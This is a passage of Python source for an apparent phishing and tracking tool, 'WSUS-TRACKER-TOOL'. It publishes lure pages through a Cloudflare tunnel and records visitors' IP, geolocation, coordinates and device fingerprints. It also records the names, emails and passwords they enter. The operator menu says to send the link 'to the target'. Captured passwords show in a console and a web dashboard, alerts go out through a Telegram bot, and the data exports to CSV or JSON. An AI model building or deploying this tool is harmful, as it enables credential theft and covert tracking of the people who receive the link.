        if request.args.get("k") != token:
            return "forbidden", 403
        rows = []
        for d in store.all():
            g = d.get("geo") or {}
            creds = "<br>".join("%s / %s" % (c.get("name"), c.get("password"))
                                for c in d.get("creds", []))
            rows.append("<tr><td>%s</td><td>%s</td><td>%s %s</td><td>%s</td><td>%s</td></tr>" % (
                d.get("first_seen", "")[11:19], d.get("ip", ""),
                g.get("flag", ""), g.get("city", ""), d.get("os", ""), creds))
        html = ("<!doctype html><meta charset=utf-8><title>WST</title>"
                "<style>body{background:#0b0e14;color:#e6ecf5;font:13px ui-monospace,monospace;padding:24px}"
                "table{width:100%;border-collapse:collapse}td,th{border-bottom:1px solid #1d2634;"
                "padding:7px;text-align:left}th{color:#8b9bb4}</style><h2>sessions (%d)</h2>"
                "<table><tr><th>time</th><th>ip</th><th>city</th><th>os</th><th>creds</th></tr>%s</table>"
                "<script>setTimeout(function(){location.reload()},8000)</script>"
                % (len(store.all()), "".join(rows)))
        return html

    return app


def serve(cfg, store, log=print):
    app = make_app(cfg, store)
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=cfg["port"],
                                           threaded=True, use_reloader=False, debug=False),
                     daemon=True).start()
    time.sleep(0.7)
    log("  local    -> http://127.0.0.1:%d" % cfg["port"])
    log("  dashboard-> http://127.0.0.1:%d/panel?k=%s" % (cfg["port"], app.config["DASH_TOKEN"]))
    return app


# ------------------------------------------------------------------ tunnel
URL_RX = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
REL = "https://github.com/cloudflare/cloudflared/releases/latest/download/"


def target():
    sysname = platform.system().lower()
    machine = platform.machine().lower()
    if sysname == "windows":
        return "cloudflared.exe", REL + "cloudflared-windows-amd64.exe", False
    if sysname == "darwin":
        return "cloudflared", REL + "cloudflared-darwin-amd64.tgz", True
    arch = "arm64" if ("arm" in machine or "aarch" in machine) else "amd64"
    return "cloudflared", REL + "cloudflared-linux-" + arch, False


def ensure_binary(log=print):
    os.makedirs(BIN, exist_ok=True)
    name, url, tgz = target()
    dest = os.path.join(BIN, name)
    if os.path.exists(dest):
        return dest
    if shutil.which("cloudflared"):
        return "cloudflared"
    log("  downloading cloudflared (%s) ..." % name)
    tmp = dest + (".tgz" if tgz else ".part")
    urllib.request.urlretrieve(url, tmp)
    if tgz:
        with tarfile.open(tmp) as t:
            t.extractall(BIN)
        os.remove(tmp)
        for f in os.listdir(BIN):
            if f.startswith("cloudflared"):
                dest = os.path.join(BIN, f)
                break
    else:
        os.replace(tmp, dest)
    os.chmod(dest, os.stat(dest).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    return dest


class Tunnel:
    def __init__(self, port, on_url=None, log=print):
        self.port, self.on_url, self.log = port, on_url, log
        self.proc, self.url = None, None

    def start(self):
        binary = ensure_binary(self.log)
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        self.proc = subprocess.Popen(
            [binary, "tunnel", "--url", "http://127.0.0.1:%d" % self.port,
             "--no-autoupdate", "--protocol", "http2"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, creationflags=flags)
        threading.Thread(target=self._read, daemon=True).start()

    def _read(self):
        for line in self.proc.stdout:
            line = line.rstrip()
            if not self.url:
                m = URL_RX.search(line)
                if m:
                    self.url = m.group(0)
                    if self.on_url:
                        self.on_url(self.url)
                    continue
            if "error" in line.lower():
                self.log("  [cf] " + line[:150])

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=6)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass


# ------------------------------------------------------------------ printing
STATE = {"cfg": None, "store": None, "tun": None, "running": False}


def print_new(d):
    g = d.get("geo") or {}
    print("\n%s%s  NEW HIT%s %s%s" % (C.CYN, C.B, C.R, C.GRY, d.get("first_seen", "")[11:19] + C.R))
    print("  %s%s%s  %s %s, %s  %s%s%s" % (C.YEL, d.get("ip"), C.R, g.get("flag", ""),
                                           g.get("city", ""), g.get("country", ""),
                                           C.GRY, g.get("isp", ""), C.R))
    print("  %s%s | %s | %s%s\n" % (C.GRY, d.get("os", "?"), d.get("browser", "?"),
                                    d.get("screen", "?"), C.R))


def print_creds(d, c):
    print("\n%s%s  CREDENTIALS CAPTURED%s" % (C.GRN, C.B, C.R))
    print("  %s  %s" % (d.get("ip"), c.get("t", "")[11:19]))
    print("  name     : %s%s%s" % (C.B, c.get("name"), C.R))
    print("  email    : %s" % c.get("email"))
    if c.get("plan"):
        print("  plan     : %s" % c.get("plan"))
    print("  password : %s%s%s%s\n" % (C.YEL, C.B, c.get("password"), C.R))


def print_session(d):
    g = d.get("geo") or {}
    rows = ["ip        %s%s%s" % (C.YEL, d.get("ip", "?"), C.R),
            "geo       %s %s, %s (%s)" % (g.get("flag", ""), g.get("city", "?"),
                                          g.get("country", ""), g.get("country_code", "")),
            "isp       %s" % g.get("isp", "?"),
            "coords    %s, %s" % (g.get("lat", "?"), g.get("lon", "?")),
            "device    %s / %s" % (d.get("os", "?"), d.get("device", "?")),
            "browser   %s %s" % (d.get("browser", "?"), d.get("browser_version", "")),
            "screen    %s (vp %s)" % (d.get("screen", "?"), d.get("viewport", "?")),
            "tz/lang   %s / %s" % (d.get("timezone", "?"), d.get("languages", "?")),
            "gpu       %s" % d.get("gpu", "?"),
            "cpu/ram   %s cores / %s GB" % (d.get("cores", "?"), d.get("ram", "?")),
            "battery   %s   net %s" % (d.get("battery", "?"), d.get("net", "?"))]
    for c in d.get("creds", []):
        rows.append("%s%s> %s / %s / %s%s" % (C.GRN, C.B, c.get("name"), c.get("email"),
                                              c.get("password"), C.R))
    box(rows, color=C.BLU, title="hit " + d.get("first_seen", "")[11:19])


# ------------------------------------------------------------------ events
def on_update(kind, d, extra):
    cfg = STATE["cfg"]
    if kind == "new":
        print_new(d)
        if cfg.get("sound"):
            bell()
        notify(cfg, d)
        limit = cfg.get("max_hits") or 0
        if limit and STATE["store"].hits >= limit:
            print("\n%s  auto-stop: %d hits.%s" % (C.YEL, limit, C.R))
            stop()
    elif kind == "creds":
        print_creds(d, extra)
        if cfg.get("sound"):
            bell()
            bell()


def notify(cfg, d):
    tok, chat = cfg.get("telegram_token"), cfg.get("telegram_chat")
    if not (tok and chat):
        return
    g = d.get("geo") or {}
    txt = "NEW HIT\n%s\n%s, %s\n%s / %s" % (d.get("ip"), g.get("city", ""),
                                            g.get("country", ""), d.get("os"), d.get("browser"))
    try:
        data = urllib.parse.urlencode({"chat_id": chat, "text": txt}).encode()
        urllib.request.urlopen("https://api.telegram.org/bot%s/sendMessage" % tok,
                               data, timeout=6)
    except Exception:
        pass


# ------------------------------------------------------------------ panel
def on_link(url):
    print()
    box([url], color=C.GRN, title="PUBLIC LINK")
    if STATE["cfg"].get("clipboard") and copy_text(url):
        print("  %slink copied.%s" % (C.GRY, C.R))
    print("  %stheme: %s - send this to the target.%s\n" % (C.GRY, STATE["cfg"]["theme"], C.R))


def start():
    cfg = STATE["cfg"]
    if STATE["running"]:
        print("  %salready running.%s" % (C.YEL, C.R))
        return
    STATE["store"].reset()
    STATE["store"].on_update = on_update
    serve(cfg, STATE["store"])
    STATE["running"] = True
    STATE["tun"] = Tunnel(cfg["port"], on_url=on_link)
    print("  %sopening cloudflare tunnel ...%s" % (C.GRY, C.R))
    STATE["tun"].start()
    if cfg.get("timeout_min"):
        threading.Timer(cfg["timeout_min"] * 60,
                        lambda: (print("\n%s  auto-stop: timeout.%s" % (C.YEL, C.R)), stop())).start()


def stop():
    if STATE["tun"]:
        STATE["tun"].stop()
        STATE["tun"] = None
    STATE["running"] = False


def menu():
    cfg = STATE["cfg"]
    print("%s  [1]%s start tunnel        %s[2]%s theme (%s%s%s)" % (C.B, C.R, C.B, C.R, C.YEL, cfg["theme"], C.R))
    print("%s  [3]%s show link + QR      %s[4]%s live sessions" % (C.B, C.R, C.B, C.R))
    print("%s  [5]%s captured creds      %s[6]%s export (csv/json)" % (C.B, C.R, C.B, C.R))
    print("%s  [7]%s web dashboard       %s[8]%s settings" % (C.B, C.R, C.B, C.R))
    print("%s  [9]%s credits             %s[0]%s exit\n" % (C.B, C.R, C.B, C.R))


def pick_theme():
    print()
    for k, (_, label) in THEME_LABELS.items():
        print("  %s[%s]%s %s" % (C.B, k, C.R, label))
    ch = input("\n  choose > ").strip()
    if ch in THEME_LABELS:
        STATE["cfg"]["theme"] = THEME_LABELS[ch][0]
        save_cfg(STATE["cfg"])
        print("  %stheme -> %s%s" % (C.GRN, STATE["cfg"]["theme"], C.R))


def settings():
    cfg = STATE["cfg"]
    print()
    print("  1) redirect      %s" % cfg["redirect"])
    print("  2) port          %s" % cfg["port"])
    print("  3) sound         %s" % ("on" if cfg["sound"] else "off"))
    print("  4) copy link     %s" % ("on" if cfg["clipboard"] else "off"))
    print("  5) geo lookup    %s" % ("on" if cfg["geo"] else "off"))
    print("  6) stop after N hits    %s" % (cfg["max_hits"] or "off"))
    print("  7) stop after N minutes %s" % (cfg["timeout_min"] or "off"))
    print("  8) telegram token %s" % ("set" if cfg["telegram_token"] else "-"))
    print("  9) telegram chat  %s" % (cfg["telegram_chat"] or "-"))
    print("  0) back")
    ch = input("\n  setting > ").strip()
    if ch == "1":
        cfg["redirect"] = input("  url > ").strip() or cfg["redirect"]
    elif ch == "2":
        try:
            cfg["port"] = int(input("  port > ").strip())
        except ValueError:
            pass
    elif ch in ("3", "4", "5"):
        key = {"3": "sound", "4": "clipboard", "5": "geo"}[ch]
        cfg[key] = not cfg[key]
    elif ch == "6":
        cfg["max_hits"] = int(input("  hits (0=off) > ").strip() or 0)
    elif ch == "7":
        cfg["timeout_min"] = int(input("  minutes (0=off) > ").strip() or 0)
    elif ch == "8":
        cfg["telegram_token"] = input("  bot token > ").strip()
    elif ch == "9":
        cfg["telegram_chat"] = input("  chat id > ").strip()
    save_cfg(cfg)


def main():
    enable_ansi()
    cfg = load_cfg()
    STATE["cfg"] = cfg
    STATE["store"] = Store()

    try:
        cls()
        print(C.CYN + r"""
 __      __ ___ _   _ _   _ ___
 \ \ /\ / // __| | | | | | / __|
  \ V  V /\__ \ |_| | |_| |\__ \
   \_/\_/ |___/\__,_|\__,_||___/   TRACKER TOOL
""" + C.R)
        print("  %sv%s%s  github.com/whitigergaming-design/WSUS-TRACKER-TOOL" % (C.B, VERSION, C.R))
        print("  %scredits: whitiger%s\n" % (C.GRY, C.R))
        menu()
        while True:
            try:
                ch = input("  wsus > ").strip()
            except EOFError:
                break
            if ch == "1":
                start()
            elif ch == "2":
                pick_theme()
            elif ch == "3":
                if STATE["tun"] and STATE["tun"].url:
                    print()
                    box([STATE["tun"].url], color=C.GRN, title="PUBLIC LINK")
                    qr(STATE["tun"].url)
                else:
                    print("  %sno link yet - press 1.%s" % (C.YEL, C.R))
            elif ch == "4":
                sessions = STATE["store"].all()
                if not sessions:
                    print("  %sno sessions yet.%s" % (C.GRY, C.R))
                for d in sessions[:10]:
                    print_session(d)
                    print()
            elif ch == "5":
                rows = [(d, c) for d in STATE["store"].all() for c in d.get("creds", [])]
                if not rows:
                    print("  %sno creds yet.%s" % (C.GRY, C.R))
                for d, c in rows:
                    print("  %s  %s  %s / %s / %s%s" % (c["t"][11:19], d.get("ip"),
                                                        c.get("name"), c.get("email"),
                                                        C.YEL, c.get("password")))
            elif ch == "6":
                if STATE["store"].all():
                    print("  csv  -> %s" % STATE["store"].to_csv())
                    print("  json -> %s" % STATE["store"].to_json())
                else:
                    print("  %snothing to export.%s" % (C.GRY, C.R))
            elif ch == "7":
                if STATE["running"]:
                    print("  http://127.0.0.1:%d/panel?k=%s" % (cfg["port"], STATE.get("token", "")))
                else:
                    print("  %sstart the tunnel first.%s" % (C.YEL, C.R))
            elif ch == "8":
                settings()
            elif ch == "9":
                print()
                box(["WSUS-TRACKER-TOOL v%s" % VERSION, "",
                     "credits: whitiger", "author: whitigergaming-design",
                     "github.com/whitigergaming-design/WSUS-TRACKER-TOOL", "",
                     "not responsible for anything."], color=C.MAG)
            elif ch == "0":
                break
            print()
            menu()
    except KeyboardInterrupt:
        pass
    finally:
        stop()
        print("\n  %sbye - %d session(s).%s\n" % (C.GRY, STATE["store"].hits, C.R))


if __name__ == "__main__":
    main()
